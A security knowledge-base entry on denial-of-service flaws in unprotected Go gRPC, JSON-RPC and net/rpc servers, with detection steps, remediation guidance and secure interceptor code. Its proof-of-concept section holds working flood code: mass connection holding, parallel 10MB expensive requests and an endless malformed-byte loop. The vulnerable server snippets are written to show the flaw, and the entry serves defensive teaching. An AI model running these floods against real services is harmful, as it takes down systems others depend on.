# DoS on RPC Nodes

## Vulnerability Title
Unprotected RPC Endpoints Leading to Denial of Service

## Severity Rating
**High🟠** (CVSS 3.1: 7.5)
- Can escalate to Critical if RPC controls critical infrastructure

## Description
This vulnerability occurs when Go RPC servers (gRPC, JSON-RPC, or net/rpc) lack proper rate limiting, authentication, or resource controls, allowing attackers to overwhelm the service with malicious requests. Attackers can exploit unbounded request processing, expensive operations, or connection exhaustion to render the RPC service unavailable.

## Technical Description (for security pros)
RPC servers are particularly vulnerable to DoS attacks due to their typically synchronous request handling, potential for expensive operations, and resource-intensive serialization/deserialization. Go's net/rpc, gRPC, and JSON-RPC implementations can be exploited through various vectors: connection flooding, request amplification, resource exhaustion via expensive methods, and malformed payload processing. Without proper defenses like rate limiting, circuit breakers, timeouts, and resource quotas, attackers can easily overwhelm RPC nodes with minimal effort.

## Common Mistakes That Cause This
- No authentication or authorization on RPC endpoints
- Missing rate limiting per client/IP
- Unbounded request sizes or complexity
- No timeout configurations
- Allowing expensive operations without throttling
- Missing connection limits
- No request validation before processing
- Synchronous processing of all requests
- Lack of circuit breakers for downstream services

## Exploitation Goals
- Render RPC services unavailable
- Exhaust server resources (CPU, memory, connections)
- Cause cascading failures in dependent services
- Disrupt critical business operations
- Create smokescreen for other attacks
- Trigger resource-based billing overages

## Affected Components or Files
- gRPC servers and interceptors
- JSON-RPC handlers
- net/rpc services
- Protocol buffer definitions
- RPC method implementations
- Connection handlers
- Serialization/deserialization logic

## Vulnerable Code Snippet
```go
// VULNERABLE: Unprotected gRPC server
type Server struct {
    pb.UnimplementedServiceServer
}

func (s *Server) ExpensiveOperation(ctx context.Context, req *pb.Request) (*pb.Response, error) {
    // No rate limiting or authentication
    result := performExpensiveComputation(req.Data)
    return &pb.Response{Result: result}, nil
}

func main() {
    lis, _ := net.Listen("tcp", ":50051")
    s := grpc.NewServer() // No interceptors or limits
    pb.RegisterServiceServer(s, &Server{})
    s.Serve(lis)
}

// VULNERABLE: JSON-RPC with no controls
type Calculator struct{}

func (c *Calculator) Factorial(n int, result *int) error {
    // No input validation - can cause CPU exhaustion
    *result = 1
    for i := 1; i <= n; i++ {
        *result *= i
    }
    return nil
}

func main() {
    calc := new(Calculator)
    rpc.Register(calc)
    rpc.HandleHTTP()
    http.ListenAndServe(":8080", nil) // Public exposure
}
```

## Detection Steps
1. Port scan for exposed RPC endpoints
2. Test endpoints without authentication
3. Monitor resource usage during request floods
4. Check for rate limiting responses
5. Attempt large payload submissions
6. Test concurrent connection limits
7. Profile CPU/memory during RPC calls
8. Review logs for timeout/error patterns

## Proof of Concept (PoC)
```go
// DoS through connection flooding
func connectionFlood(target string) {
    for i := 0; i < 10000; i++ {
        go func() {
            conn, _ := grpc.Dial(target, grpc.WithInsecure())
            defer conn.Close()
            // Keep connection open
            time.Sleep(1 * time.Hour)
        }()
    }
}

// DoS through expensive operations
func cpuExhaustion(target string) {
    conn, _ := grpc.Dial(target, grpc.WithInsecure())
    client := pb.NewServiceClient(conn)
    
    // Parallel expensive requests
    var wg sync.WaitGroup
    for i := 0; i < 1000; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            ctx := context.Background()
            // Request triggering expensive computation
            client.ExpensiveOperation(ctx, &pb.Request{
                Data: strings.Repeat("A", 10*1024*1024), // 10MB
            })
        }()
    }
    wg.Wait()
}

// DoS through malformed requests
func malformedRequests(target string) {
    // Send raw malformed data to RPC port
    conn, _ := net.Dial("tcp", target)
    for {
        // Invalid protocol buffer data
        conn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF})
    }
}
```

## Risk Classification
- **Availability Impact**: High (service unavailability)
- **Integrity Impact**: Low
- **Confidentiality Impact**: Low
- **Exploitability**: High (easy to execute)
- **Business Impact**: High (service disruption)

## Fix & Patch Guidance
```go
// SECURE: Protected gRPC server with multiple defenses
func createSecureGRPCServer() *grpc.Server {
    // Rate limiting interceptor
    rateLimiter := ratelimit.New(100) // 100 requests per second
    
    opts := []grpc.ServerOption{
        // Connection limits
        grpc.MaxConcurrentStreams(1000),
        grpc.ConnectionTimeout(30 * time.Second),
        
        // Unary interceptor chain
        grpc.ChainUnaryInterceptor(
            authInterceptor,
            rateLimitInterceptor(rateLimiter),
            timeoutInterceptor(5 * time.Second),
            validationInterceptor,
        ),
        
        // Stream interceptor chain
        grpc.ChainStreamInterceptor(
            authStreamInterceptor,
            rateLimitStreamInterceptor(rateLimiter),
        ),
        
        // Message size limits
        grpc.MaxRecvMsgSize(1 * 1024 * 1024), // 1MB
        grpc.MaxSendMsgSize(1 * 1024 * 1024),
    }
    
    return grpc.NewServer(opts...)
}

// Rate limiting interceptor
func rateLimitInterceptor(rl ratelimit.Limiter) grpc.UnaryServerInterceptor {
    return func(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
        rl.Take() // Block until rate limit allows
        return handler(ctx, req)
    }
}

// Timeout interceptor
func timeoutInterceptor(timeout time.Duration) grpc.UnaryServerInterceptor {
    return func(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
        ctx, cancel := context.WithTimeout(ctx, timeout)
        defer cancel()
        return handler(ctx, req)
    }
}

// Circuit breaker for expensive operations
var cb = gobreaker.NewCircuitBreaker(gobreaker.Settings{
    Name:        "expensive_op",
    MaxRequests: 3,
    Interval:    10 * time.Second,
    Timeout:     30 * time.Second,
})

func (s *Server) ExpensiveOperation(ctx context.Context, req *pb.Request) (*pb.Response, error) {
    // Validate input size
    if len(req.Data) > 1024*1024 {
        return nil, status.Error(codes.InvalidArgument, "request too large")
    }
    
    // Use circuit breaker
    result, err := cb.Execute(func() (interface{}, error) {
        return performExpensiveComputation(req.Data), nil
    })
    
    if err != nil {
        return nil, status.Error(codes.Unavailable, "service temporarily unavailable")
    }
    
    return &pb.Response{Result: result.(string)}, nil
}
```

## Scope and Impact
- Affects all exposed RPC endpoints
- Can cascade to dependent microservices
- May impact SLA compliance
- Potential for complete service outage
- Resource consumption affecting co-located services

## Remediation Recommendation
1. **Immediate Actions**:
   - Implement rate limiting on all RPC endpoints
   - Add authentication/authorization
   - Set connection and message size limits
   - Configure appropriate timeouts
   - Enable monitoring and alerting

2. **Defense Layers**:
   - **Network Level**: Firewall rules, DDoS protection
   - **Transport Level**: TLS, connection limits
   - **Application Level**: Rate limiting, circuit breakers
   - **Method Level**: Input validation, resource quotas

3. **Configuration Guidelines**:
   - Max concurrent connections: Based on server capacity
   - Request timeout: 5-30 seconds depending on operation
   - Message size limit: 1-10MB typically
   - Rate limit: 100-1000 req/s per client
   - Circuit breaker threshold: 50% error rate

4. **Monitoring Requirements**:
   - Request rates per endpoint
   - Response times and error rates
   - Resource utilization (CPU, memory, connections)
   - Circuit breaker status
   - Client behavior patterns

## Summary
DoS attacks on RPC nodes exploit the resource-intensive nature of remote procedure calls to overwhelm services. Go RPC implementations require multiple layers of defense including authentication, rate limiting, timeouts, and circuit breakers. The ease of launching DoS attacks makes this a high-priority vulnerability. Organizations must implement comprehensive protection strategies combining network-level defenses with application-specific controls to ensure RPC service availability.

## References
- gRPC Best Practices - Rate Limiting and Load Balancing
- OWASP API Security Top 10 - API4: Lack of Resources & Rate Limiting
- Go gRPC Middleware Documentation
- Circuit Breaker Pattern - Martin Fowler
- DDoS Protection Best Practices - NIST SP 800-61